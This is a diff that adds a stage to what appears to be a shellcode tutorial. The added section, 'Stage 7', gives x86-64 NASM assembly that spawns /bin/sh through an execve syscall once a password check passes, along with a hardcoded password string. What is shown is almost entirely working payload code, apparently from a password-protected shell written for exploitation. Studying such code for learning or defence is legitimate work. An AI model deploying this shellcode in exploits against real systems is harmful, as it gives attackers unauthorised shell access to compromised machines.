@@ -282,3 +282,35 @@ mov rdi, rsi
 scasq
 jne exit
 ```
+
+<h3>Stage 7 - Spawn the shell, if password is correct</h3>
+
+```c
+execve(arguments[0], &arguments[0], NULL);
+```
+
+```nasm
+        xor rax, rax
+        push rax
+
+        mov rbx, 0x68732f2f6e69622f
+        push rbx
+
+        mov rdi, rsp
+
+        push rax
+
+        mov rdx, rsp
+
+        push rdi
+        mov rsi, rsp
+        mov rax, 59
+        syscall
+
+        ; change as needed
+        pass: db "16bytessssss"
+
+exit:
+        mov rax, 60
+        syscall
+```
